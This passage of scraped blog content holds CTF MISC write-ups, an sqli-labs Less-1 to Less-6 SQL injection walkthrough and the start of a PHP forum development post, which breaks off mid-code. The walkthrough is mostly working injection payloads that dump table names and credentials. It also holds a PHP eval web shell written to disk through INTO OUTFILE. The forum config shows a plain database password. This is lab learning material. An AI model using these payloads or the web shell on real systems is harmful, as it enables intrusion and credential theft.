看题目提示，emmm。。题目看起来似乎好难。下载题目文件。只有一个conf.bin文件，并且打不开。分析工具用了一波，然而并没有获取到有用信息。。。。于是查百度、查谷歌。。 了解到：路由器备份的配置文件一般是.bin格式，默认名称通常是conf.bin，通常用“RouterPass”路由器工具打开bin文件。 于是当然是下载工具了。下载后打开题目文件 然后不断翻找有用信息，发现宽带用户名了。。。 然后按格式提交就行了。。。 MISC3(come_game)本题主要是脑洞和信息发现 看题目了解到，这道题应该是和游戏有关，并且要通关才有flag。下载题目文件，解压，得到一个.exe可执行文件。运行，发现果然这是个游戏。。。。 在玩之后发现，生成了名字为save1、temp、DeathTime三个文件。分别用notepad++打开后发现，save1有点特殊 想到可能这个2，就是通关关卡数，改为5，打开游戏。果然如此，通关获取到flag了！。。 解题完毕，此题结束。。 MISC4(linux)本题主要是linux系统的常用命令使用 看到题目，了解到需要linux系统的命令操作。好在我提前已经装过linux虚拟机。那先了解一下linux常用基础命令 ||Linux基础命令吧。 了解完之后，开始继续做题吧！下载题目文件，得到1.tar .gz。打开发现文档flag。所以用cat由第一行开始显示档案内容。 这个就应该是所谓的flag了。。。提交，果然是。 MISC5(做个游戏(08067CTF))本题主要是java反编译 看题目的意思知道，这道题又是一个游戏，并且要求坚持60秒才有flag。然后下载文件，然后打开，发现果然是个游戏。那就开始玩吧。。移动白色方块，避免被撞击，发现可以移动到永远不被撞击的地方哎。然而，等了60秒并没有什么用。。。。 然后，想其他方法了。发现heiheihei.jar用winrar打开，发现了一些图片。 于是我尝试只留第一张，其他全移走。结果发现 显示flag了，然而并没有完全显示完。emmmmm。。。。。既然显示了，那应该在java程序中能找到。百度或谷歌一下，发现有个java反编译工具JD-GUI。下载用下，然而我不知什么原因，并没有下载成功。于是下载了相似工具。用java反编译工具直接打开jar文件，发现并没有有用信息。于是先用winrar打开jar文件，用java反编译工具打开相应组成文件。。。发现flag了。。。 直接提交，发现并不对，发现花括号里的应该Base64加密了。解密后提交，成功了。 MISC6(想蹭网先解开密码)本题主要是了解wifi认证WPA的四次握手包，并根据已给信息生成密码字典破解密码。 了解：wifi握手包,即采用WPA加密方式的无线AP与无线客户端进行连接前的认证信息包 这道题我参考了大佬的博客做的。了解到通过握手包(此题是wifi.cap)便可以对密码进行暴力猜解。题目已经给了前七位。那由此生成一个密码词典吧！于是找了个脚本: 生成字典文件 f=open('pass.txt','w')for i in range(0,10000): psd='1391040'+str(i).zfill(4) f.write(psd+'\\n') 然后用到软件 EWSA导入字典文件，进行暴力猜解，就行了。 emmmm。。。星号是什么鬼。。。不知到怎么才能显示。换另一种方式解题吧。。。。不想叙述了，有个大佬总结的比较详细，可以参考一下。。还有个linux系统的解题方式吧。 总结结束，参考一些知识和大佬的博客，又收获了好多。。继续努力。。。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"BUGKU","slug":"BUGKU","permalink":"https://qwzf.gitee.io/blog/tags/BUGKU/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"}],"author":"qwzf"},{"title":"sqli-labs攻关1(Less-1_Less-6)","slug":"sqli-labs攻关1(Less-1_Less-6)","date":"2019-06-10T11:03:52.130Z","updated":"2019-11-16T17:07:19.342Z","comments":true,"path":"2019/06/10/sqli-labs攻关1(Less-1_Less-6)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/06/10/sqli-labs攻关1(Less-1_Less-6)/","excerpt":"","text":"前言为了更好的学习和练习有关SQL注入的知识,于是我开启了sqli-labs的通关之路。。。。 为了方便学习查看，我在源码中的$sql下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的） echo \"你的 sql 语句是：\".$sql.\"&lt;br&gt;\"; 在开始注入之前，我学习了下面这些相关sql注入基础知识。 sql注入基础知识1.判断是否存在sql注入1、get 单引号判断?id=1&#39; 如果报错说明存在sql注入输入?id=1显示正常输入?id=1&#39;显示错误，所以就存在sql注入&#39;的url编码是%27 2、get and判断输入?id=-1&#39;and 1=1 正常输入?id=-1&#39;and 1=2 报错如果报错，那就存在sql；但由于mysql版本问题，2个都存在报错，所欲还是要看具体报错。才能更具报错内容进一步判断是否存在sql注入。 3、Or、xor判断or xor方法和and方法一致。4、sql运算符判断输入?id=5-0输入?id=5-1输入?id=5+1通过匹对获取到的内容是否一致，不一致代表存在sql注入； 5、通过sleep函数演示显示的形式进行判断payload ?id=1' and if(left(database(),1)='s',sleep(5),1)--+ 表示5秒后响应内容 6、服务端返回错误形式错误直接回显在页面上错误隐藏在页面源代码中检测到错误跳转到另一个页面返回HTTP错误代码500或重定向302适当处理错误结果，常显示一个通用错误页面 2.post、get、编码常用&#39;or and 1=1 # &#39;or and 1=1 –-+ #是sql语句中的注释符； + 在http请求中表示空格； -- 后面的语句相当于被注释掉,不执行后面的sql语句； --+代表闭合sql查询语句，如果没加，无法形成有效的mysql语句，这是sql注入中常见的巧妙运用。 在post参数中要加空格符，直接输入空格服即可；用+会被http请求转义为%2B编码；在get请求中在get请求中如果有空格，需要用空格符编码%20来替代，不然会请求报错；如果用#表示不提交#后面的参数到服务端，但是转成%23编码就可以提交过去；常见URL编码空格 %20 +%2b &lt;%3c &gt;%3e 更多参考https://www.w3school.com.cn/tags/html_ref_urlencode.html或者工具查询https://tool.chinaz.com/tools/urlencode.aspx 神奇的编码可以进行各种绕过！！ 3.sql注入常用mysql函数1、order by该函数用于对结果集进行排序，主要用于猜字段。例如我们在实验室less-1输入?id=1要确定它里面有多少个字段，就要用到order by了例如输入?id=1 order by 3 --+ 显示正常再次输入?id=1 order by 4 --+ 显示错误所以的出，在?id=1查看的这个表有3个字段 2、unionunion在sql注入测试过程中，几乎经常用到，进行联合查询 例：?id=-1&#39; union select 1,user(),database() --+ 3、MIDSELECT MID(ColumnName, Start [, Length]) FROM TableName4、LEFT(str,len)返回字符串str的最左面len个字符5、ASCII(str) =ORD返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL6、SUBSTR(str,pos,len)从str中多少个字符开始，截取多少位7、CASTSELECT CAST(’12’ AS int) 将目标str转化为目标数据类型8、IFNULL(expr1,expr2)如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr29、updatexml()updatexml(1,concat(0x7e,user(),0x7e),1)其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误显示user()该函数。但显示出来的内容最多只有32个字符串；利用原理对他是对XML文档进行更新的函数；语法：updatexml(目标xml文档，xml路径，更新的内容)10、extractvalue()extractvalue也是运用于报错sql注入；利用原理对XML文档进行查询的函数；语法：extractvalue(目标xml文档，xml路径)熟悉mysql常见的判断语句函数参考文章https://www.runoob.com/mysql/mysql-functions.html11、LOAD_FILE可以利用该函数，进写入shell用法：select load_file(‘file1’) into outfile ‘file2’将file1的文件导入WEB目录file2的文件中进行访问！ 例： ?id=1’)) union select 1,2,’&lt;?php* [@eval](http://github.com/eval)*($_POST[“cmd”]);?&gt;’ into outfile “/home/wwwroot/default/test.php”—+* 看完后，有了大致了解，是时候开启注入攻关之旅了。。 一、错误型-GET注入大致思路：闭合-&gt;输入sql查询(这里是联合查询)语句-&gt;注释后边条件 因为错误型GET注入过于基础，所以这一部分直接构造payload，开始注入了。。 1、Less-1错误型GET单引号字符型注入单引号字符型注入：通过&#39;的报错进行sql查询，并用mysql能输出字符串型的函数，获取我们想要的数据。 1、发现注入点 输入?id=1 正常； 输入?id=1&#39; 报错，就存在sql注入漏洞。 2、猜id=1显示条件中表的字段 例如输入?id=1&#39; order by 3 --+ 显示正常再次输入?id=1&#39; order by 4 --+ 显示错误 所以我得出，在?id=1查看的这个表有3个字段 3、爆数据库 payload ?id=-1' union select 1,2,database() --+ 4、爆数据表 payload ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 5、爆数据列(字段) payload ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 6、爆数据值 payload ?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+ 要点1、union select 1,group_concat(table_name),3?id=-1等于我们要查询的表，在实验第一步时候，我们得到该查询的表有3个字段；所以我们在构建select时候，必须满足3个字段条件；例如：select 1,2,3 那么 group_concat(table_name)表示2；这点有点像数组，你必须规定3个值，才能进行正常的赋值后显示。 2、group_concat()group_concat函数是典型的字符串连接函数； 3、0x3a0x3a是:16进制的分隔符,比如在爆开数据值使用中(username,0x3a,password)表示(username:password) 4、information_schema表示存储了数据表tables 列columns的元数据信息;用法：常规的sql查询中from xxx查询的元素或表 where xxx查询的条件；5、database()列出数据库的库名；6、table_schema=database()累出数据库的表名，这里存在赋值 2、Less-2错误型GET整型注入整型注入：提交的URL参数为整数类型 与Less-1错误型GET单引号字符型注入 区别在于，构建payload时去掉&#39;单引号 1、爆数据库 payload ?id=-1 union select 1,2,database() --+ 2、爆数据表 payload ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 4、爆数据值 payload ?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+ 3、Less-3错误型GET单引号变形字符型注入常见SQL变形字符串注入： 将查询条件转为base64 本实验用)来实现变形； 宽字节字体编码利用，例如gbk中文字符，这种比较难用；例如试图用%df%5c%27试图在%df%5c%27为中文字符绕过%27PHP魔术引用的转义成\\%27但也要取决于环境；故此宽字节去做sql注入的转义绕过很难。 与Less-2错误型GET整型注入区别在于，构建payload新增&#39;)单引号，)表示变形！ 1、爆数据库 payload ?id=-1') union select 1,2,database() --+ 2、爆数据表 pyload ?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 4、爆数据值 payload ?id=-1') union select 1,group_concat(username,0x3a,password),3 from users--+ 4、Less-4错误型GET双引号字符型注入与Less-3错误型GET单引号变形字符型注入区别在于，构建payload更改为&quot;)双引号；)表示变形 1、爆数据库 payload ?id=-1\") union select 1,2,database() --+ 2、爆数据表 payload ?id=-1\") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1\") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 4、爆数据值 payload ?id=-1\") union select 1,group_concat(username,0x3a,password),3 from users--+ 二、双查询注入(报错注入)-GET注入双注入： 双注入就是嵌套子查询。 多走一条查询或者数据排序途径，获取想要的数据,例如select …(select …)，里面的那个select被称为子查询，它的执行顺序先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数利用： rand()随机函数，返回0~1之间的某个值floor(a)取整函数，返回小于等于a，且值最接近a的一个整数count()聚合函数也称作计数函数，返回查询对象的总数group by cluase分组语句，按照cluase对查询结果分组 原理： 当一个字符串函数，例如concat函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 5、Less-5双注入GET单引号字符型注入先尝试一下?id=-1&#39; union select 1,2,database() --+进行爆库，发现报错了,但是union没有出结果。 于是查询了一些相关知识和大佬的博客后。有了大致思路。 首先，查看一下源码 查询后发现：mysql_error() 函数返回上一个 MySQL 操作产生的文本错误信息。如果没有出错则返回 ‘’（空字符串）。 这样的话只能采取报错注入了。下面是我参考大佬博客得到的知识： (1)通过floor报错and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符(2)通过updatexml报错and updatexml(1,payload,1)同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效(3)通过ExtractValue报错and extractvalue(1, payload)输出字符有长度限制，最长32位。payload即我们要输入的sql查询语句 floor报错注入即双查询注入 双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。 ?id=1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id=1' union select count(*),1, concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id=-1' union select count(*),2,concat('*',(select database()),'*',floor(rand()*2))as a from information_schema.tables group by a--+?id=-1' and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 这些理解之后，就可以愉快的爆库、爆表、爆字段、报内容了。。。 1、爆数据库 payload ?id=-1'union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 爆数据用户,将mysql系统函数database()改为user()即可。 2、爆数据表 当我尝试把爆数据库的payload改为爆数据表的payload时 ?id=-1'union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 发现 意思就是一次只能返回不超过一条数据。所以此时我使用limit进行限制 payload ?id=-1'union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 查出结果了。。。同理，查其他数据表，把limit条件换一下就🆗了 3、爆数据列(字段) 和爆数据表类似，只是改变了下payload，开始尝试注入 ?id=-1'union select count(*),1, concat('~',(select concat(column_name) from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 结果，并没有爆出什么内容。 于是，我仔细考虑了一下，发现当payload的条件where后再多加一个条件table_schema=database()爆出字段内容了。。。 payload ?id=-1'union select count(*),1, concat('~',(select concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 同理，爆其他字段，改一下limit条件就好了。。。 4、爆数据值 这个与上面比，就稍微有点简单了。直接上payload，开始注入 payload ?id=-1'union select count(*),1, concat('~',(select concat(username,0x3a,password) from users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 直接爆出内容了。同理，爆其他数据值同上改limit条件。。 6、Less-6双注入GET双引号字符型注入与上一个实验Less-5双注入GET单引号字符型注入手法上几乎一致！区别在于payload中&#39;单引号改为&quot;双引号。 但我查询了一些大佬的博客，发现了另一种方法。方法如下： 布尔型注入 布尔型注入简称盲注，正确会回显，错误没有回显，以此为依据逐字进行想要的字段或者命名进行猜解爆破；在上面的实验中我们已知：数据库名security表名users字段username password手工注入时可使用例如left((select database()),1)&lt;’s’ 这样的比较排序第几位的二分查找方法快速猜解爆破。 emmmm。。。。好像不太明白left有什么用，查查看。。。查询后了解到如下信息： Sql注入截取字符串常用函数mid()函数 此函数为截取字符串一部分。MID(column_name,start[,length]) 参数 描述 column_name 必需。要提取字符的字段 start 必需。规定开始位置（起始值是 1） length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本 例： str=”123456” mid(str,2,1) 结果为2 Sql用例： （1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 （2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 substr()函数 Substr()和substring()函数实现的功能是一样的，均为截取字符串。 string substring(string, start, length) string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。 Sql用例： (1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 (2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。 Left()函数 Left()得到字符串左部指定个数的字符 Left ( string, n ) string为要截取的字符串，n为长度。 Sql用例： (1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。 (2) 同样的string可以为自行构造的sql语句。 同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’ Sql注入截取字符串常用函数原文链接 这些知识了解之后可以愉快的注入了。。。 1、爆数据库 payload1正确并有回显，表的开头排序第一位为s ?id=1\" and left((select database()),1)='s'--+ payload2正确并有回显，表的开头排序第一位不是i，但前面有i ?id=1\" and left((select database()),1)&gt;'i'--+ payload3错误并无回显，表的开头排序第一位后面没有i ?id=1\" and left((select database()),1)&lt;'i'--+ left((select database()),1)&lt;&#39;s&#39; 中1表示当前有1个字符取开头1个字符来猜测是否存在，这个顺序是前到后，是有顺序的。如果更换为8,那么就表示当前有8个字符取8个字符来猜测是否存在；所以s要改为security刚好8个字符8个排序，8个字符一起对比是正确还是错误。 ?id=1\" and left((select database()),8)='security'--+ 这样，我可以得知表名为security 2、爆数据表 payload1 从limit 的第1个数据第1行数据开始猜解 ?id=1\" and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='u' --+ payload2 从limit 从第5条数据取第1条数据开始猜解；limit 4,1 表示第5条数据，程序世界的排序01234 ?id=1\" and left((select table_name from information_schema.tables where table_schema=database() limit 4,1),1)='u' --+ 修改limit x,1和left中的位数限定数字，在第三张表爆破到user表，名为users ?id=1\" and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' --+ 3、爆数据列(字段) 与上面大致是同理的，所以直接上payload ?id=1\" and left((select column_name from information_schema.columns where table_name='users' limit 2,1),8)='password' --+ 4、爆数据值 与上面大致是同理的，所以还是直接上payload ?id=1\" and left((select password from users order by id limit 0,1),1)='d' --+ 使用order by按照id来排序，limit 从0开始到需要的字段.最后爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。 布尔型的盲注，全靠猜。。。。。可以写个脚本猜，效率高点。 这篇博客暂且先总结那么多吧。。。。 在错误型和双注入的关卡中，又收获了好多。。继续努力，小白进阶ing。。。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"GET型错误型注入","slug":"GET型错误型注入","permalink":"https://qwzf.gitee.io/blog/tags/GET型错误型注入/"},{"name":"GET型双查询注入","slug":"GET型双查询注入","permalink":"https://qwzf.gitee.io/blog/tags/GET型双查询注入/"}],"author":"qwzf"},{"title":"Web开发-简单BBS论坛","slug":"Web开发-简单BBS论坛","date":"2019-06-05T09:32:32.267Z","updated":"2019-08-01T05:38:02.018Z","comments":true,"path":"2019/06/05/Web开发-简单BBS论坛/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/06/05/Web开发-简单BBS论坛/","excerpt":"","text":"开发了两周的bbs论坛系统，总算在上周完成了，并且已经把项目文件上传到github上了。[我的bbs]。。。 开发完之后，感觉对sql语句、mysql函数和PHP代码有了深刻的理解。同时了解了开发流程。。好像收获很多耶！！！总结一下吧。。。 大致思路需求 浏览者有浏览任何版块、任何帖子以及任何回复的权限，并且任何浏览者都有注册成为本论坛的用户的权限。 注册用户比浏览者多了发帖，回复帖子的权限，且具有成为某子版块版主的机会 版主比注册用户多出删除本版块帖子和相关回复的权限 管理员具有操作网站后台的权限(比如设置版块、更改站点信息、帖子管理、用户管理等) 功能 数据库设计 1、数据库名称：bbs 2、数据表： (1）father_module父版块表 字段：id、module_name、sort (2）son_module子版块表 字段：id、father_module_id、module_name、info、member_id、sort (3）member会员表 字段：id、username、password、photo、register_name、last_time (4）content帖子表 字段：id、module_id、title、content、time、member_id、times (5）reply帖子回复表 字段：id、content_id、quote_id、content、time、member_id (6）manage管理员表 字段：id、username、password (7) info站点信息 字段：id、title、keywords、description 程序目录结构 admin/：存放后台程序文件 inc/：存放被包含的文件 style/：存放样式、图片 （后台我使用的是css\\、fonts\\和images。存放样式、图片） uploads/：存放上传文件 其他各种文件 开发步骤 前台与后台的界面 后台-父版块 后台-子版块 前台-用户注册 前台-用户发帖 前台-帖子列表页 前台-帖子内容页 前台-帖子回复 前台-首页 前台-用户中心 等等… 开发步骤实现准备因为写总结时，功能已经实现。所以把开发过程中的一些准备，直接都写出来了。 mysql函数库在与admin同级目录inc/里创建一个php文件名为mysql.inc.php。并在文件里写入相关mysql函数。代码【mysql.inc.php】 相关设置同样在与admin同级目录inc/里创建一个php文件名为config.inc.php。里面包括设置时区、开启session、转换编码、设置数据库连接信息和找到绝对路径。代码如下： &lt;?php date_default_timezone_set('Asia/Shanghai');//设置时区session_start();header('Content-type:text/html;charset=utf-8');define('DB_HOST','localhost');define('DB_USER','root');define('DB_PASSWORD','199910mm');define('DB_DATABASE','bbs');define('DB_PORT',3306);//项目（程序），在服务器上的绝对路径define('SA_PATH',dirname(dirname(__FILE__)));//项目在web根目录下面的位置（哪个目录里面）define('SUB_URL',str_replace($_SERVER['DOCUMENT_ROOT'],'',str_replace('\\\\','/',SA_PATH)).'/');?&gt; 跳转和登录验证直接跳转，执行结果信息不太明确。可以设置跳转结果显示。如图： 于是把该功能写在了php文件tool.inc.php。该文件中也写了会员是否登录验证和管理员是否登录的验证。 代码【tool.inc.php】 后台相关验证为了方便，我将admin目录里的inc/目录里的相关验证写在下面 1.check_father_module.inc.php 2.check_login.inc.php 3.check_manage.inc.php 4.check_son_module.inc.php 5.is_manage_login.inc.php 【相关代码】 后台删除确认页confirm.php【代码地址】 一、前台与后台的界面前台和后台界面可以自己用html和css写，也可以找一些模板。我为了方便，于是找了模板。。。。毕竟是主要为了练习php和sql语句以及mysql函数。 前台界面模板 后台界面模板 后台界面有点不合适，于是把顶部、底部和左侧写在不同文件，把后台界面修改了一下 header.inc.php、sidebar.inc.php和footer.inc.php(都在admin目录里的inc目录里) //header.inc.php&lt;?php$query=\"select * from info where id=1\";$result_info=execute($link, $query);$data_info=mysqli_fetch_assoc($result_info);?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;?php echo $template['title'] ?&gt; - &lt;?php echo $data_info['title']?&gt;&lt;/title&gt; &lt;meta name=\"keywords\" content=\"&lt;?php echo $data_info['keywords']?&gt;\" /&gt; &lt;meta name=\"description\" content=\"&lt;?php echo $data_info['description']?&gt;\" /&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"css/common.css\"/&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"topbar-wrap white\"&gt; &lt;div class=\"topbar-inner clearfix\"&gt; &lt;div class=\"topbar-logo-wrap clearfix\"&gt; &lt;h1 class=\"topbar-logo none\"&gt;&lt;a href=\"index.html\" class=\"navbar-brand\"&gt;后台管理&lt;/a&gt;&lt;/h1&gt; &lt;ul class=\"navbar-list clearfix\"&gt; &lt;li&gt;&lt;a class=\"on\" href=\"login.html\"&gt;后台首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"../index.php\" target=\"_blank\"&gt;网站首页&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=\"top-info-wrap\"&gt; &lt;ul class=\"top-info-list clearfix\"&gt; &lt;li&gt;管理员&lt;?php echo $_SESSION['manage']['username']?&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"logout.php\"&gt;注销&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; //sidebar.inc.php&lt;div class=\"container clearfix\"&gt; &lt;div class=\"sidebar-wrap\"&gt; &lt;div class=\"sidebar-title\"&gt; &lt;h1&gt;菜单&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"sidebar-content\"&gt; &lt;ul class=\"sidebar-list\"&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe018;&lt;/i&gt;系统&lt;/a&gt; &lt;ul class=\"sub-menu\"&gt; &lt;li&gt;&lt;a href=\"index.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe017;&lt;/i&gt;系统信息&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"manage.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe014;&lt;/i&gt;管理员&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"manage_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe068;&lt;/i&gt;添加管理员&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"system.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe002;&lt;/i&gt;站点设置&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe009;&lt;/i&gt;内容管理&lt;/a&gt; &lt;ul class=\"sub-menu\"&gt; &lt;li&gt;&lt;a href=\"father_module.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe006;&lt;/i&gt;父版块列表&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"father_module_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe005;&lt;/i&gt;添加父版块&lt;/a&gt;&lt;/li&gt; &lt;?php if(basename($_SERVER['SCRIPT_NAME'])=='father_module_update.php')&#123; echo '&lt;li&gt;&lt;a href=\"#\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe002;&lt;/i&gt;编辑父板块&lt;/a&gt;&lt;/li&gt;'; &#125; ?&gt; &lt;li&gt;&lt;a href=\"son_module.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe006;&lt;/i&gt;子版块列表&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"son_module_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe005;&lt;/i&gt;添加子版块&lt;/a&gt;&lt;/li&gt; &lt;?php if(basename($_SERVER['SCRIPT_NAME'])=='son_module_update.php')&#123; echo '&lt;li&gt;&lt;a href=\"#\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe002;&lt;/i&gt;编辑子板块&lt;/a&gt;&lt;/li&gt;'; &#125; ?&gt; &lt;li&gt;&lt;a href=\"../index.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe012;&lt;/i&gt;帖子管理&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe003;&lt;/i&gt;用户管理&lt;/a&gt; &lt;ul class=\"sub-menu\"&gt; &lt;li&gt;&lt;a href=\"member_list.php\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe041;&lt;/i&gt;用户列表&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; //footer.inc.php&lt;/body&gt;&lt;/html&gt; 效果 二、后台-父版块父版块列表页 要实现上述效果。 思路首先，引入文件config.inc.php、mysql.inc.php、tool.inc.php、header.inc.php、sidebar.inc.php。 其次，连接数据库、管理员是否登录验证、写出页面标题(在页面顶部文件输出)、执行sql增删改查对father_module数据表信息进行相关操作，在修改、添加版块，引入文件进行输入内容的相关验证(check_father_module.inc.php)。 最后，在以关联数组的方式获取一条记录的数据。在定界符区域内输出id、排序和父版块的名字，以及删除和修改超链接。点击删除，跳转到father_module_delete.php，通过获取的id删除指定版块。 点击修改，跳转到father_module_update.php通过sql语句的增删改查，进行修改。 父版块代码如下： 1.father_module.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';$template['title']='父板块列表页';$query=\"select*from father_module\";$result=execute($link,$query);?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"index.php\"&gt;后台首页&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;父版块列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-wrap\"&gt; &lt;form name=\"myform\" id=\"myform\" method=\"post\"&gt; &lt;div class=\"result-title\"&gt; &lt;div class=\"result-list\"&gt; &lt;a href=\"father_module_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;新增板块&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"100%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"5%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;th&gt;排序&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;版块名称&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php while($data=mysqli_fetch_assoc($result))&#123; $url=urlencode(\"father_module_delete.php?id=&#123;$data['Id']&#125;\"); 